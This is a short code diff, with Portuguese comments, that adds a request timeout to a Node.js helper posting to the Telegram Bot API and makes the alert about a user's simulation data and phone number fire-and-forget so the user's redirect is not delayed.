@@ -70,17 +70,19 @@ function sendTelegramRequest(token, payload) {
     const data = JSON.stringify(payload);
     const req = https.request({
       hostname: 'api.telegram.org',
-      path: `/bot${token}/sendMessage`,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
+      path    : `/bot${token}/sendMessage`,
+      method  : 'POST',
+      timeout : 4000, // timeout agressivo — nunca trava o redirect do usuário
+      headers : {
+        'Content-Type'  : 'application/json',
         'Content-Length': Buffer.byteLength(data)
       }
     }, (res) => {
       res.on('data', () => {});
-      res.on('end', () => resolve());
+      res.on('end',  () => resolve());
     });
-    req.on('error', () => resolve());
+    req.on('error',   () => resolve());
+    req.on('timeout', () => { req.destroy(); resolve(); });
     req.write(data);
     req.end();
   });
@@ -143,7 +145,8 @@ function sendTelegramAlert(simData, phone) {
       reply_markup: { inline_keyboard: inlineButtons }
     };
 
-    sendTelegramRequest(token, payload);
+    // Telegram fire-and-forget — não espera resposta
+    setImmediate(() => sendTelegramRequest(token, payload));
   } catch (e) {}
 }
 
